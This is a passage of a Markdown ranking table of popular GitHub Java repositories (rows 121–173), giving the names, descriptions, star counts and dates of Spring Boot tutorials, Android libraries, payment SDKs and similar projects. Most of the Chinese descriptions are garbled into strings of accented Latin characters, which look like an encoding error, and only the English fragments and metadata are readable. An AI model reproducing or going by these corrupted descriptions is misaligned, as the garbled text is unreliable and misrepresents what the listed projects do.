|121|[brianway/java-learning](https://github.com/brianway/java-learning)|Êó®Âú®ÊâìÈÄ†Âú®Á∫øÊúÄ‰Ω≥ÁöÑ Java Â≠¶‰π†Á¨îËÆ∞ÔºåÂê´ÂçöÂÆ¢ËÆ≤Ëß£ÂíåÊ∫êÁ†ÅÂÆû‰æãÔºåÂåÖÊã¨ Java SE Âíå Java Web|3.5k|Java|10/13|
|122|[Nepxion/Discovery](https://github.com/Nepxion/Discovery)|‚òÄÔ∏è Nepxion Discovery is an enhancement for Spring Cloud with gray, blue greeen, weight route, limitation, circuit breaker, degrade, failover, isolation, tracing ÁÅ∞Â∫¶ËìùÁªø„ÄÅÊùÉÈáçË∑ØÁî±„ÄÅÈôêÊµÅÁÜîÊñ≠ÈôçÁ∫ß„ÄÅÊïÖÈöúËΩ¨Áßª„ÄÅÈöîÁ¶ª„ÄÅËøΩË∏™|3.5k|Java|10/29|
|123|[hansonwang99/Spring-Boot-In-Action](https://github.com/hansonwang99/Spring-Boot-In-Action)|Spring Boot Á≥ªÂàóÂÆûÊàòÂêàÈõÜ|3.5k|Java|10/13|
|124|[pqpo/SmartCropper](https://github.com/pqpo/SmartCropper)|üî• A library for cropping image in a smart way that can identify the border and correct the cropped image.    Êô∫ËÉΩÂõæÁâáË£ÅÂâ™Ê°ÜÊû∂„ÄÇËá™Âä®ËØÜÂà´ËæπÊ°ÜÔºåÊâãÂä®Ë∞ÉËäÇÈÄâÂå∫Ôºå‰ΩøÁî®ÈÄèËßÜÂèòÊç¢Ë£ÅÂâ™Âπ∂Áü´Ê≠£ÈÄâÂå∫ÔºõÈÄÇÁî®‰∫éË∫´‰ªΩËØÅÔºåÂêçÁâáÔºåÊñáÊ°£Á≠âÁÖßÁâáÁöÑË£ÅÂâ™„ÄÇ|3.4k|Java|06/17|
|125|[ming1016/study](https://github.com/ming1016/study)|Â≠¶‰π†ËÆ∞ÂΩï|3.4k|Java|05/05|
|126|[ZHENFENG13/spring-boot-projects](https://github.com/ZHENFENG13/spring-boot-projects)|ËØ•‰ªìÂ∫ì‰∏≠‰∏ªË¶ÅÊòØ Spring Boot ÁöÑÂÖ•Èó®Â≠¶‰π†ÊïôÁ®ã‰ª•Âèä‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ Spring Boot ÂÆûÊàòÈ°πÁõÆÊïôÁ®ãÔºåÂåÖÊã¨ Spring Boot ‰ΩøÁî®ÁöÑÂêÑÁßçÁ§∫‰æã‰ª£Á†ÅÔºåÂêåÊó∂‰πüÂåÖÊã¨‰∏Ä‰∫õÂÆûÊàòÈ°πÁõÆÁöÑÈ°πÁõÆÊ∫êÁ†ÅÂíåÊïàÊûúÂ±ïÁ§∫ÔºåÂÆûÊàòÈ°πÁõÆÂåÖÊã¨Âü∫Êú¨ÁöÑ web ÂºÄÂèë‰ª•ÂèäÁõÆÂâçÂ§ßÂÆ∂ÊôÆÈÅç‰ΩøÁî®ÁöÑÁ∫ø‰∏äÂçöÂÆ¢È°πÁõÆ/‰ºÅ‰∏öÂ§ßÂûãÂïÜÂüéÁ≥ªÁªü/ÂâçÂêéÁ´ØÂàÜÁ¶ªÂÆûË∑µÈ°πÁõÆÁ≠âÔºåÊëÜËÑ±ÂêÑÁßç hello world ÂÖ•Èó®Ê°à‰æãÁöÑÊùüÁºöÔºåÁúüÊ≠£ÁöÑÊéåÊè° Spring Boot ÂºÄÂèë„ÄÇ|3.4k|Java|05/30|
|127|[mercyblitz/tech-weekly](https://github.com/mercyblitz/tech-weekly)|„ÄåÂ∞èÈ©¨Âì•ÊäÄÊúØÂë®Êä•„Äç|3.4k|Java|03/29|
|128|[guolindev/giffun](https://github.com/guolindev/giffun)|‰∏ÄÊ¨æÂºÄÊ∫êÁöÑGIFÂú®Á∫øÂàÜ‰∫´AppÔºå‰πêË∂£Â∞±Ë¶ÅÂíå‰∏ñÁïåÂàÜ‰∫´„ÄÇ|3.3k|Java|02/06|
|129|[JZ-Darkal/AndroidHttpCapture](https://github.com/JZ-Darkal/AndroidHttpCapture)|AndroidHttpCaptureÁΩëÁªúËØäÊñ≠Â∑•ÂÖ∑ ÊòØ‰∏ÄÊ¨æAndroidÊâãÊú∫ÊäìÂåÖËΩØ‰ª∂ ‰∏ªË¶ÅÂäüËÉΩÂåÖÊã¨ÔºöÊâãÊú∫Á´ØÊäìÂåÖ„ÄÅPING/DNS/TraceRouteËØäÊñ≠„ÄÅÊäìÂåÖHARÊï∞ÊçÆ‰∏ä‰º†ÂàÜ‰∫´„ÄÇ‰Ω†‰πüÂèØ‰ª•ÁúãÊàêÊòØAndroidÁâàÁöÑ""Fiddler"" \(^o^)/~|3.3k|Java|10/19|
|130|[bjmashibing/InternetArchitect](https://github.com/bjmashibing/InternetArchitect)|Âπ¥Ëñ™Áôæ‰∏á‰∫íËÅîÁΩëÊû∂ÊûÑÂ∏àËØæÁ®ãÊñáÊ°£ÂèäÊ∫êÁ†Å(ÂÖ¨ÂºÄÈÉ®ÂàÜ)|3.2k|Java|10/09|
|131|[hope-for/hope-boot](https://github.com/hope-for/hope-boot)|üå± Hope-Boot ‰∏ÄÊ¨æÁé∞‰ª£ÂåñÁöÑËÑöÊâãÊû∂È°πÁõÆ|3.2k|Java|09/10|
|132|[zuihou/zuihou-admin-cloud](https://github.com/zuihou/zuihou-admin-cloud)|Âü∫‰∫éSpringCloud(Hoxton.SR7) + SpringBoot(2.2.9.RELEASE) ÁöÑÂæÆÊúçÂä°ËÑöÊâãÊû∂ÔºåÂÖ∑ÊúâÁªü‰∏ÄÊéàÊùÉ„ÄÅËÆ§ËØÅÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂÖ∂‰∏≠ÂåÖÂê´ÂÖ∑Â§áÁî®Êà∑ÁÆ°ÁêÜ„ÄÅËµÑÊ∫êÊùÉÈôêÁÆ°ÁêÜ„ÄÅÁΩëÂÖ≥API„ÄÅÂàÜÂ∏ÉÂºè‰∫ãÂä°„ÄÅÂ§ßÊñá‰ª∂Êñ≠ÁÇπÂàÜÁâáÁª≠‰º†Á≠âÂ§ö‰∏™Ê®°ÂùóÔºåÊîØÊåÅÂ§ö‰∏öÂä°Á≥ªÁªüÂπ∂Ë°åÂºÄÂèëÔºåÂèØ‰ª•‰Ωú‰∏∫ÂêéÁ´ØÊúçÂä°ÁöÑÂºÄÂèëËÑöÊâãÊû∂„ÄÇ‰ª£Á†ÅÁÆÄÊ¥ÅÔºåÊû∂ÊûÑÊ∏ÖÊô∞ÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÁõ¥Êé•È°πÁõÆ‰∏≠‰ΩøÁî®„ÄÇÊ†∏ÂøÉÊäÄÊúØÈááÁî®Nacos„ÄÅFegin„ÄÅRibbon„ÄÅZuul„ÄÅHystrix„ÄÅJWT Token„ÄÅMybatis„ÄÅSpringBoot„ÄÅRedis„ÄÅRibbitMQÁ≠â‰∏ªË¶ÅÊ°ÜÊû∂Âíå‰∏≠Èó¥‰ª∂„ÄÇ|3.2k|Java|10/26|
|133|[mpusher/mpush](https://github.com/mpusher/mpush)|MPushÂºÄÊ∫êÂÆûÊó∂Ê∂àÊÅØÊé®ÈÄÅÁ≥ªÁªü|3.2k|Java|06/16|
|134|[luojilab/DDComponentForAndroid](https://github.com/luojilab/DDComponentForAndroid)|‰∏ÄÂ•óÂÆåÊï¥ÊúâÊïàÁöÑandroidÁªÑ‰ª∂ÂåñÊñπÊ°àÔºåÊîØÊåÅÁªÑ‰ª∂ÁöÑÁªÑ‰ª∂ÂÆåÂÖ®ÈöîÁ¶ª„ÄÅÂçïÁã¨Ë∞ÉËØï„ÄÅÈõÜÊàêË∞ÉËØï„ÄÅÁªÑ‰ª∂‰∫§‰∫í„ÄÅUIË∑≥ËΩ¨„ÄÅÂä®ÊÄÅÂä†ËΩΩÂç∏ËΩΩÁ≠âÂäüËÉΩ|3.2k|Java|08/05|
|135|[dromara/hmily](https://github.com/dromara/hmily)|ÈáëËûçÁ∫ßÊüîÊÄßÂàÜÂ∏ÉÂºè‰∫ãÂä°Ëß£ÂÜ≥ÊñπÊ°à|3.1k|Java|10/29|
|136|[getActivity/AndroidProject](https://github.com/getActivity/AndroidProject)|Android Êû∂ÊûÑÈ°πÁõÆÔºåÂè™‰∏∫ÂÜôÂ•ΩÊØè‰∏ÄÂè•‰ª£Á†Å|3.1k|Java|07/17|
|137|[stylefeng/Guns](https://github.com/stylefeng/Guns)|GunsÂü∫‰∫éSpringBoot 2ÔºåËá¥Âäõ‰∫éÂÅöÊõ¥ÁÆÄÊ¥ÅÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂÆåÁæéÊï¥Âêàspringmvc + shiro + mybatis-plus + beetl!GunsÈ°πÁõÆ‰ª£Á†ÅÁÆÄÊ¥ÅÔºåÊ≥®Èáä‰∏∞ÂØåÔºå‰∏äÊâãÂÆπÊòìÔºåÂêåÊó∂GunsÂåÖÂê´ËÆ∏Â§öÂü∫Á°ÄÊ®°Âùó(Áî®Êà∑ÁÆ°ÁêÜÔºåËßíËâ≤ÁÆ°ÁêÜÔºåÈÉ®Èó®ÁÆ°ÁêÜÔºåÂ≠óÂÖ∏ÁÆ°ÁêÜÁ≠â10‰∏™Ê®°Âùó)ÔºåÂèØ‰ª•Áõ¥Êé•‰Ωú‰∏∫‰∏Ä‰∏™ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑËÑöÊâãÊû∂!|3.1k|Java|07/02|
|138|[Exrick/xboot](https://github.com/Exrick/xboot)|Âü∫‰∫éSpring Boot 2.xÁöÑ‰∏ÄÁ´ôÂºèÂâçÂêéÁ´ØÂàÜÁ¶ªÂø´ÈÄüÂºÄÂèëÂπ≥Âè∞XBoot ÂæÆ‰ø°Â∞èÁ®ãÂ∫è+Uniapp ÂâçÁ´ØÔºöVue+iView Admin ÂêéÁ´ØÔºöSpring Boot 2.x/Spring Security/JWT/JPA+Mybatis-Plus/Redis/Elasticsearch/Activiti ÂàÜÂ∏ÉÂºèÈôêÊµÅ/ÂêåÊ≠•ÈîÅ/È™åËØÅÁ†Å/SnowFlakeÈõ™Ëä±ÁÆóÊ≥ïIDÁîüÊàê Âä®ÊÄÅÊùÉÈôêÁÆ°ÁêÜ Êï∞ÊçÆÊùÉÈôê Â∑•‰ΩúÊµÅ ‰ª£Á†ÅÁîüÊàê ÂÆöÊó∂‰ªªÂä° Á¨¨‰∏âÊñπÁ§æ‰∫§Ë¥¶Âè∑„ÄÅÁü≠‰ø°ÁôªÂΩï ÂçïÁÇπÁôªÂΩï OAuth2ÂºÄÊîæÂπ≥Âè∞|3.0k|Java|10/30|
|139|[liuyubobobo/Play-with-Algorithms](https://github.com/liuyubobobo/Play-with-Algorithms)|Codes of my MOOC Course <Play with Algorithms>, Both in C++ and Java language. Updated contents and practices are also included. ÊàëÂú®ÊÖïËØæÁΩë‰∏äÁöÑËØæÁ®ã„ÄäÁÆóÊ≥ï‰∏éÊï∞ÊçÆÁªìÊûÑ„ÄãÁ§∫‰æã‰ª£Á†ÅÔºåÂåÖÊã¨C++ÂíåJavaÁâàÊú¨„ÄÇËØæÁ®ãÁöÑÊõ¥Â§öÊõ¥Êñ∞ÂÜÖÂÆπÂèäËæÖÂä©ÁªÉ‰π†‰πüÂ∞ÜÈÄêÊ≠•Ê∑ªÂä†ËøõËøô‰∏™‰ª£Á†Å‰ªì„ÄÇ|3.0k|Java|09/06|
|140|[Doikki/DKVideoPlayer](https://github.com/Doikki/DKVideoPlayer)|Android Video Player. ÂÆâÂçìËßÜÈ¢ëÊí≠ÊîæÂô®ÔºåÂ∞ÅË£ÖMediaPlayer„ÄÅExoPlayer„ÄÅIjkPlayer„ÄÇÊ®°‰ªøÊäñÈü≥Âπ∂ÂÆûÁé∞È¢ÑÂä†ËΩΩÔºåÂàóË°®Êí≠ÊîæÔºåÊÇ¨ÊµÆÊí≠ÊîæÔºåÂπøÂëäÊí≠ÊîæÔºåÂºπÂπï|3.0k|Java|06/01|
|141|[promeG/TinyPinyin](https://github.com/promeG/TinyPinyin)|ÈÄÇÁî®‰∫éJavaÂíåAndroidÁöÑÂø´ÈÄü„ÄÅ‰ΩéÂÜÖÂ≠òÂç†Áî®ÁöÑÊ±âÂ≠óËΩ¨ÊãºÈü≥Â∫ì„ÄÇ|3.0k|Java|10/18|
|142|[tuguangquan/mybatis](https://github.com/tuguangquan/mybatis)|mybatisÊ∫êÁ†Å‰∏≠ÊñáÊ≥®Èáä|2.9k|Java|10/13|
|143|[zhou-you/RxEasyHttp](https://github.com/zhou-you/RxEasyHttp)|Êú¨Â∫ìÊòØ‰∏ÄÊ¨æÂü∫‰∫éRxJava2+Retrofit2ÂÆûÁé∞ÁÆÄÂçïÊòìÁî®ÁöÑÁΩëÁªúËØ∑Ê±ÇÊ°ÜÊû∂ÔºåÁªìÂêàandroidÂπ≥Âè∞ÁâπÊÄßÁöÑÁΩëÁªúÂ∞ÅË£ÖÂ∫ì,ÈááÁî®apiÈìæÂºèË∞ÉÁî®‰∏ÄÁÇπÂà∞Â∫ï,ÈõÜÊàêcookieÁÆ°ÁêÜ,Â§öÁßçÁºìÂ≠òÊ®°Âºè,ÊûÅÁÆÄhttpsÈÖçÁΩÆ,‰∏ä‰º†‰∏ãËΩΩËøõÂ∫¶ÊòæÁ§∫,ËØ∑Ê±ÇÈîôËØØËá™Âä®ÈáçËØï,ËØ∑Ê±ÇÊê∫Â∏¶token„ÄÅÊó∂Èó¥Êà≥„ÄÅÁ≠æÂêçsignÂä®ÊÄÅÈÖçÁΩÆ,Ëá™Âä®ÁôªÂΩïÊàêÂäüÂêéËØ∑Ê±ÇÈáçÂèëÂäüËÉΩ,3ÁßçÂ±ÇÊ¨°ÁöÑÂèÇÊï∞ËÆæÁΩÆÈªòËÆ§ÂÖ®Â±ÄÂ±ÄÈÉ®,ÈªòËÆ§Ê†áÂáÜApiResultÂêåÊó∂ÂèØ‰ª•ÊîØÊåÅËá™ÂÆö‰πâÁöÑÊï∞ÊçÆÁªìÊûÑÔºåÂ∑≤ÁªèËÉΩÊª°Ë∂≥Áé∞Âú®ÁöÑÂ§ßÈÉ®ÂàÜÁΩëÁªúËØ∑Ê±Ç„ÄÇ|2.9k|Java|09/22|
|144|[crazyandcoder/citypicker](https://github.com/crazyandcoder/citypicker)|citypickerÂüéÂ∏ÇÈÄâÊã©Âô®ÔºåËØ¶ÁªÜÁöÑÁúÅÂ∏ÇÂå∫Âú∞ÂùÄ‰ø°ÊÅØÔºåÊîØÊåÅ‰ªøiOSÊªöËΩÆÂÆûÁé∞Ôºå‰ªø‰∫¨‰∏úÊ†∑ÂºèÔºå‰∏ÄÁ∫ßÊàñËÄÖ‰∏âÁ∫ßÂàóË°®Â±ïÁ§∫ÊñπÂºè„ÄÇ|2.9k|Java|04/29|
|145|[Snailclimb/springboot-guide](https://github.com/Snailclimb/springboot-guide)|Not only Spring Boot but also important knowledge of SpringÔºà‰∏çÂè™ÊòØSpringBootËøòÊúâSpringÈáçË¶ÅÁü•ËØÜÁÇπÔºâ|2.8k|Java|10/13|
|146|[huburt-Hu/NewbieGuide](https://github.com/huburt-Hu/NewbieGuide)|Android Âø´ÈÄüÂÆûÁé∞Êñ∞ÊâãÂºïÂØºÂ±ÇÁöÑÂ∫ìÔºåÈÄöËøáÁÆÄÊ¥ÅÈìæÂºèË∞ÉÁî®Ôºå‰∏ÄË°å‰ª£Á†ÅÂÆûÁé∞ÂºïÂØºÂ±ÇÁöÑÊòæÁ§∫|2.8k|Java|07/01|
|147|[lenve/JavaEETest](https://github.com/lenve/JavaEETest)|Spring„ÄÅSpringMVC„ÄÅMyBatis„ÄÅSpring BootÊ°à‰æã|2.7k|Java|10/13|
|148|[FinalTeam/RxGalleryFinal](https://github.com/FinalTeam/RxGalleryFinal)|ÂõæÁâáÈÄâÊã©Â∫ìÔºåÂçïÈÄâ/Â§öÈÄâ„ÄÅÊãçÁÖß„ÄÅË£ÅÂâ™„ÄÅÂéãÁº©ÔºåËá™ÂÆö‰πâ„ÄÇÂåÖÊã¨ËßÜÈ¢ëÈÄâÊã©ÂíåÂΩïÂà∂„ÄÇ|2.7k|Java|09/25|
|149|[mxdldev/android-mvp-mvvm-flytour](https://github.com/mxdldev/android-mvp-mvvm-flytour)|üî•üî•üî• FlyTourÊòØAndroid MVVM+MVP+Dagger2+Retrofit+RxJava+ÁªÑ‰ª∂Âåñ+Êèí‰ª∂ÁªÑÊàêÁöÑÂèåÁºñÁ†ÅÊû∂ÊûÑ+ÂèåÂ∑•Á®ãÊû∂ÊûÑ+ÂèåËØ≠Ë®ÄAndroidÂ∫îÁî®ÂºÄÂèëÊ°ÜÊû∂ÔºåÈÄöËøá‰∏çÊñ≠ÁöÑÂçáÁ∫ßËø≠‰ª£ËØ•Ê°ÜÊû∂Â∑≤ÁªèÊúâ‰∫ÜÂçÅ‰∏™‰∏çÂêåÁöÑÁâàÊú¨Ôºå5.0‰πãÂâçÂ∑•Á®ãÊû∂ÊûÑÈááÁî®gradleÈÖçÁΩÆÂÆûÁé∞ÁªÑ‰ª∂ÂåñÔºå5.0‰πãÂêéÁöÑÂ∑•Á®ãÊû∂ÊûÑÈááÁî®VirtualAPKÂÆûÁé∞‰∫ÜÊèí‰ª∂ÂåñÔºå5.0‰πãÂâçÈááÁî®JavaÁºñÁ†ÅÂÆûÁé∞Ôºå5.0‰πãÂêéÈááÁî®KotlinÁºñÁ†ÅÂÆûÁé∞ÔºåÁºñÁ†ÅÊû∂ÊûÑÁî±MVVMÂíåMVPÁªÑÊàêÔºåÂ∑•Á®ãÊû∂ÊûÑÂíåÁºñÁ†ÅÊû∂ÊûÑÂèäÁºñÁ†ÅËØ≠Ë®ÄÂºÄÂèëËÄÖÂèØÊ†πÊçÆËá™Â∑±ÂÖ∑‰ΩìÁöÑÈ°πÁõÆÂÆûÈôÖÈúÄÊ±ÇÂéªÂÜ≥ÂÆöÈÄâÊã©‰ΩøÁî®ÔºåËØ•Ê°ÜÊû∂ÊòØAndroidÁªÑ‰ª∂Âåñ„ÄÅAndroidÊèí‰ª∂Âåñ„ÄÅAndroid MVPÊû∂ÊûÑ„ÄÅAn ...|2.7k|Java|06/29|
|150|[macrozheng/springcloud-learning](https://github.com/macrozheng/springcloud-learning)|‰∏ÄÂ•óÊ∂µÁõñÂ§ßÈÉ®ÂàÜÊ†∏ÂøÉÁªÑ‰ª∂‰ΩøÁî®ÁöÑSpring CloudÊïôÁ®ãÔºåÂåÖÊã¨Spring Cloud AlibabaÂèäÂàÜÂ∏ÉÂºè‰∫ãÂä°SeataÔºåÂü∫‰∫éSpring Cloud GreenwichÂèäSpringBoot 2.1.7„ÄÇ21ÁØáÊñáÁ´†ÔºåÁØáÁØáÁ≤æÂçéÔºå32‰∏™DemoÔºåÊ∂µÁõñÂ§ßÈÉ®ÂàÜÂ∫îÁî®Âú∫ÊôØ„ÄÇ|2.7k|Java|09/15|
|151|[jiajunhui/PlayerBase](https://github.com/jiajunhui/PlayerBase)|The basic library of Android player will process complex business components. The access is simple„ÄÇAndroidÊí≠ÊîæÂô®Âü∫Á°ÄÂ∫ìÔºå‰∏ìÊ≥®‰∫éÊí≠ÊîæËßÜÂõæÁªÑ‰ª∂ÁöÑÈ´òÂ§çÁî®ÊÄßÂíåÁªÑ‰ª∂Èó¥ÁöÑ‰ΩéËÄ¶ÂêàÔºåËΩªÊùæÂ§ÑÁêÜÂ§çÊùÇ‰∏öÂä°„ÄÇ|2.7k|Java|10/11|
|152|[MagicMashRoom/SuperCalendar](https://github.com/MagicMashRoom/SuperCalendar)|@Deprecated android Ëá™ÂÆö‰πâÊó•ÂéÜÊéß‰ª∂  ÊîØÊåÅÂ∑¶Âè≥Êó†ÈôêÊªëÂä® Âë®ÊúàÂàáÊç¢ Ê†áËÆ∞Êó•ÊúüÊòæÁ§∫ Ëá™ÂÆö‰πâÊòæÁ§∫ÊïàÊûúË∑≥ËΩ¨Âà∞ÊåáÂÆöÊó•Êúü|2.7k|Java|05/31|
|153|[saysky/ForestBlog](https://github.com/saysky/ForestBlog)|‰∏Ä‰∏™ÁÆÄÂçïÊºÇ‰∫ÆÁöÑSSM(Spring+SpringMVC+Mybatis)ÂçöÂÆ¢Á≥ªÁªü|2.7k|Java|10/24|
|154|[JavaNoober/BackgroundLibrary](https://github.com/JavaNoober/BackgroundLibrary)|A framework for directly generating shape through Tags, no need to write shape.xml againÔºàÈÄöËøáÊ†áÁ≠æÁõ¥Êé•ÁîüÊàêshapeÔºåÊó†ÈúÄÂÜçÂÜôshape.xmlÔºâ|2.7k|Java|10/20|
|155|[Javen205/IJPay](https://github.com/Javen205/IJPay)|IJPay ËÆ©ÊîØ‰ªòËß¶ÊâãÂèØÂèäÔºåÂ∞ÅË£Ö‰∫ÜÂæÆ‰ø°ÊîØ‰ªò„ÄÅQQÊîØ‰ªò„ÄÅÊîØ‰ªòÂÆùÊîØ‰ªò„ÄÅ‰∫¨‰∏úÊîØ‰ªò„ÄÅÈì∂ËÅîÊîØ‰ªò„ÄÅPayPal ÊîØ‰ªòÁ≠âÂ∏∏Áî®ÁöÑÊîØ‰ªòÊñπÂºè‰ª•ÂèäÂêÑÁßçÂ∏∏Áî®ÁöÑÊé•Âè£„ÄÇ‰∏ç‰æùËµñ‰ªª‰ΩïÁ¨¨‰∏âÊñπ mvc Ê°ÜÊû∂Ôºå‰ªÖ‰ªÖ‰Ωú‰∏∫Â∑•ÂÖ∑‰ΩøÁî®ÁÆÄÂçïÂø´ÈÄüÂÆåÊàêÊîØ‰ªòÊ®°ÂùóÁöÑÂºÄÂèëÔºåÂèØËΩªÊùæÂµåÂÖ•Âà∞‰ªª‰ΩïÁ≥ªÁªüÈáå„ÄÇÂè≥‰∏äËßíÁÇπ‰∏ãÂ∞èÊòüÊòü‚ú® |2.6k|Java|09/24|
|156|[xuexiangjys/XUI](https://github.com/xuexiangjys/XUI)|üíç‰∏Ä‰∏™ÁÆÄÊ¥ÅËÄå‰ºòÈõÖÁöÑAndroidÂéüÁîüUIÊ°ÜÊû∂ÔºåËß£Êîæ‰Ω†ÁöÑÂèåÊâãÔºÅ|2.6k|Java|10/14|
|157|[AbrahamCaiJin/CommonUtilLibrary](https://github.com/AbrahamCaiJin/CommonUtilLibrary)|Âø´ÈÄüÂºÄÂèëÂ∑•ÂÖ∑Á±ªÊî∂ÈõÜÔºåÂè≤‰∏äÊúÄÂÖ®ÁöÑÂºÄÂèëÂ∑•ÂÖ∑Á±ªÔºåÊ¨¢ËøéFollow„ÄÅFork„ÄÅStar|2.6k|Java|05/11|
|158|[dingjikerbo/Android-BluetoothKit](https://github.com/dingjikerbo/Android-BluetoothKit)|Android BLEËìùÁâôÈÄö‰ø°Â∫ì|2.6k|Java|02/12|
|159|[fengjundev/Android-Skin-Loader](https://github.com/fengjundev/Android-Skin-Loader)|‰∏Ä‰∏™ÈÄöËøáÂä®ÊÄÅÂä†ËΩΩÊú¨Âú∞ÁöÆËÇ§ÂåÖËøõË°åÊç¢ËÇ§ÁöÑÁöÆËÇ§Ê°ÜÊû∂|2.5k|Java|02/11|
|160|[android-notes/Cockroach](https://github.com/android-notes/Cockroach)|Èôç‰ΩéAndroidÈùûÂøÖË¶Åcrash|2.5k|Java|08/28|
|161|[prontera/spring-cloud-rest-tcc](https://github.com/prontera/spring-cloud-rest-tcc)|‰ª•Spring Cloud Netflix‰Ωú‰∏∫ÊúçÂä°Ê≤ªÁêÜÂü∫Á°Ä, Â±ïÁ§∫Âü∫‰∫étccÊÄùÊÉ≥ÊâÄÂÆûÁé∞ÁöÑÂàÜÂ∏ÉÂºè‰∫ãÂä°Ëß£ÂÜ≥ÊñπÊ°à|2.5k|Java|02/09|
|162|[KingJA/LoadSir](https://github.com/KingJA/LoadSir)|A lightweight, good expandability Android library used for displaying different pages like loading, error, empty, timeout or even your custom page when you load a page.(‰ºòÈõÖÂú∞Â§ÑÁêÜÂä†ËΩΩ‰∏≠ÔºåÈáçËØïÔºåÊó†Êï∞ÊçÆÁ≠â)|2.5k|Java|09/25|
|163|[yangchong211/LifeHelper](https://github.com/yangchong211/LifeHelper)|„ÄêÂÅúÊ≠¢Áª¥Êä§„ÄëÁªÑ‰ª∂ÂåñÁªºÂêàÊ°à‰æãÔºåÂåÖÂê´ÂæÆ‰ø°Êñ∞ÈóªÔºåÂ§¥Êù°ËßÜÈ¢ëÔºåÁæéÂ•≥ÂõæÁâáÔºåÁôæÂ∫¶Èü≥‰πêÔºåÂπ≤Ê¥ªÈõÜ‰∏≠Ëê•ÔºåÁé©AndroidÔºåË±ÜÁì£ËØª‰π¶ÁîµÂΩ±ÔºåÁü•‰πéÊó•Êä•Á≠âÁ≠âÊ®°Âùó„ÄÇÊû∂ÊûÑÊ®°ÂºèÔºöÁªÑ‰ª∂Âåñ+MVP+Rx+Retrofit+Desgin+Dagger2+ÈòøÈáåVLayout+ËÖæËÆØX5+ËÖæËÆØbugly„ÄÇËûçÂêàÂºÄÂèë‰∏≠ÈúÄË¶ÅÁöÑÂêÑÁßçÂ∞èÊ°à‰æãÔºÅ|2.5k|Java|10/28|
|164|[qunarcorp/bistoury](https://github.com/qunarcorp/bistoury)|BistouryÊòØÂéªÂì™ÂÑøÁΩëÁöÑjavaÂ∫îÁî®Áîü‰∫ßÈóÆÈ¢òËØäÊñ≠Â∑•ÂÖ∑ÔºåÊèê‰æõ‰∫Ü‰∏ÄÁ´ôÂºèÁöÑÈóÆÈ¢òËØäÊñ≠ÊñπÊ°à|2.5k|Java|10/23|
|165|[Hitomis/transferee](https://github.com/Hitomis/transferee)|‰∏Ä‰∏™Â∏ÆÂä©ÊÇ®ÂÆåÊàê‰ªéÁº©Áï•ËßÜÂõæÂà∞ÂéüËßÜÂõæÊó†ÁºùËøáÊ∏°ËΩ¨ÂèòÁöÑÁ•ûÂ•áÊ°ÜÊû∂|2.4k|Java|06/27|
|166|[doocs/jvm](https://github.com/doocs/jvm)|ü§ó JVM Â∫ïÂ±ÇÂéüÁêÜÁü•ËØÜÊÄªÁªì|2.4k|Java|10/24|
|167|[KunMinX/Linkage-RecyclerView](https://github.com/KunMinX/Linkage-RecyclerView)|Âç≥‰Ωø‰∏çÁî®È•ø‰∫Ü‰πàËÆ¢È§êÔºå‰πüËØ∑Âä°ÂøÖÊî∂ËóèÂ•ΩËØ•Â∫ìÔºÅüî•  ‰∏ÄË°å‰ª£Á†ÅÂç≥ÂèØÊé•ÂÖ•Ôºå‰∫åÁ∫ßËÅîÂä®ËÆ¢È§êÂàóË°® - Even if you don't order food by PrubHub, be sure to collect this library, please! üî• This secondary linkage list widget can be accessed by only one line of code. Supporting by RecyclerView & AndroidX.|2.4k|Java|09/20|
|168|[metersphere/metersphere](https://github.com/metersphere/metersphere)|An open source continuous testing platform. MeterSphere ÊòØ‰∏ÄÁ´ôÂºèÁöÑÂºÄÊ∫ê‰ºÅ‰∏öÁ∫ßÊåÅÁª≠ÊµãËØïÂπ≥Âè∞ÔºåÊ∂µÁõñÊµãËØïË∑üË∏™„ÄÅÊé•Âè£ÊµãËØï„ÄÅÊÄßËÉΩÊµãËØï„ÄÅÂõ¢ÈòüÂçè‰ΩúÁ≠âÂäüËÉΩÔºåÂÖ®Èù¢ÂÖºÂÆπ JMeter„ÄÅPostman Á≠âÂºÄÊ∫ê„ÄÅ‰∏ªÊµÅÊ†áÂáÜ„ÄÇÈ°πÁõÆÈááÁî® SpringBoot 2.x + MyBatis + Vue.js + Element + Docker + Kafka + MySQLÁ≠âÂºÄÂèë„ÄÇ|2.4k|Java|10/29|
|169|[BaronZ88/MinimalistWeather](https://github.com/BaronZ88/MinimalistWeather)|Android Âπ≥Âè∞ÂºÄÊ∫êÂ§©Ê∞î AppÔºåÈááÁî® MVP„ÄÅRxJava„ÄÅRetrofit2„ÄÅOKHttp3„ÄÅDagger2„ÄÅRetroLambda Á≠âÂºÄÊ∫êÂ∫ìÊù•ÂÆûÁé∞„ÄÇ|2.4k|Java|10/09|
|170|[AlexLiuSheng/CheckVersionLib](https://github.com/AlexLiuSheng/CheckVersionLib)|ÁâàÊú¨Ê£ÄÊµãÂçáÁ∫ßÔºàÊõ¥Êñ∞ÔºâÂ∫ì„ÄÇan auto check version libraryÔºàapp updateÔºâ on Android|2.4k|Java|09/28|
|171|[Pay-Group/best-pay-sdk](https://github.com/Pay-Group/best-pay-sdk)|ÂèØËÉΩÊòØÊúÄÂ•ΩÁöÑÊîØ‰ªòSDK|2.3k|Java|10/19|
|172|[LaiFeng-Android/SopCastComponent](https://github.com/LaiFeng-Android/SopCastComponent)|Êù•ÁñØÁõ¥Êí≠ÂÆâÂçìÊéß‰ª∂ÔºåÊîØÊåÅflvÔºåÊîØÊåÅrtmpÔºåÊîØÊåÅÊ∑ªÂä†ËßÜÈ¢ëÁâπÊïàÁ≠âÁ≠â|2.3k|Java|06/04|
|173|[JeremyLiao/LiveEventBus](https://github.com/JeremyLiao/LiveEventBus)|:mailbox_with_mail:EventBus for AndroidÔºåÊ∂àÊÅØÊÄªÁ∫øÔºåÂü∫‰∫éLiveDataÔºåÂÖ∑ÊúâÁîüÂëΩÂë®ÊúüÊÑüÁü•ËÉΩÂäõÔºåÊîØÊåÅStickyÔºåÊîØÊåÅAndroidXÔºåÊîØÊåÅË∑®ËøõÁ®ãÔºåÊîØÊåÅË∑®APP|2.3k|Java|08/26|
